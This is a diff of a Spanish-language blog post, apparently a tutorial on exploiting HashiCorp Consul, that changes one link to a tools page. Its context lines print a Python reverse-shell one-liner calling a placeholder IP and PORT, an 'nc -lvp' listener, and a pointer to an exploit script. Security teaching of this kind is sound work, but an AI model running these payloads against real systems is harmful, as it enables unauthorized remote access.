@@ -61,7 +61,7 @@ Si la ejecución de comandos funciona. El próximo paso puede ser explotar Consu
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-Para facilitar la explotación podéis utilizar el siguiente script: [exploit-consul](https://github.com/adanalvarez/exploit-consul) que podéis encontrar también en nuestra sección de [herramientas](https://donttouchmy.net/herramientas/).
+Para facilitar la explotación podéis utilizar el siguiente script: [exploit-consul](https://github.com/adanalvarez/exploit-consul) que podéis encontrar también en nuestra sección de [herramientas](https://donttouchmynet.github.io/categories/#herramientas/).
 {: style="text-align: justify;"}
 
 Para obtener una reverse shell primero utilizaremos el comando nc -lvp 4567 para esperar una conexión en el puerto 4567.
